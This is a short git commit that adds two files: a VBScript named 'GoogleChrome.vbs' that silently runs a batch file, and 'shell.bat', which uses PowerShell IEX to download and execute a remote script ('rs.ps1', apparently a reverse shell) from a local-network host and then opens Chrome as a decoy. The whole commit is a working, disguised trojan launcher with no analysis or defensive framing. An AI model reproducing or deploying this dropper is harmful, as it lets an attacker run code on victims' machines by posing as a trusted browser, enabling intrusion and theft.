78ffe35b8e3ac63a34a9d346288e9c3ba93851db
DumuziT <71425551+DumuziT@users.noreply.github.com>
2022-06-13 12:29:50 -0400

    Add files via upload

---
+++ GoogleChrome.vbs
@@ -0,0 +1,2 @@
+Set objShell = WScript.CreateObject("WScript.Shell")
+objShell.Run "shell.bat", 0, True
---
+++ shell.bat
@@ -0,0 +1,2 @@
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.99:8080/rs.ps1')"
+start chrome.exe
